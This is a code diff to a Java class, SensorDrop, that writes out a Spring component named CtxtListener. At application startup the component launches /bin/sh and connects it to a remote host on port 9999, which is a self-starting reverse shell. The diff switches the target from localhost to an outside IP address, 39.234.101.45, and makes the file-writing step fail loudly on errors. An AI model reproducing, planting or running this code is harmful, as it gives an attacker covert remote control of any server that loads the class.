@@ -16,19 +16,19 @@ public class SensorDrop {
             import org.springframework.context.ApplicationListener;
             import org.springframework.context.event.ContextRefreshedEvent;
             import org.springframework.stereotype.Component;
-                        
+
             @Component
             public class CtxtListener extends TimerTask implements ApplicationListener<ContextRefreshedEvent> {
                 public CtxtListener() {
                 }
-                        
+
                 public void onApplicationEvent(ContextRefreshedEvent contextRefreshedEvent) {
                     (new Timer()).schedule(new CtxtListener(), 500L);
                 }
-                        
+
                 public void run() {
                     try {
-                        String host = "127.0.0.1";
+                        String host = "39.234.101.45";
                         int port = 9999;
                         String cmd = "/bin/sh";
                         Process p = (new ProcessBuilder(new String[]{cmd})).redirectErrorStream(true).start();
@@ -79,7 +79,8 @@ public class SensorDrop {
                 try (OutputStream out = Files.newOutputStream(ctxtFile.toPath(), StandardOpenOption.CREATE)) {
                     writeClass(pkgName, out);
                 } catch (IOException e) {
-
+					// DF: added
+                    throw new RuntimeException(e);
                 }
             }
         }
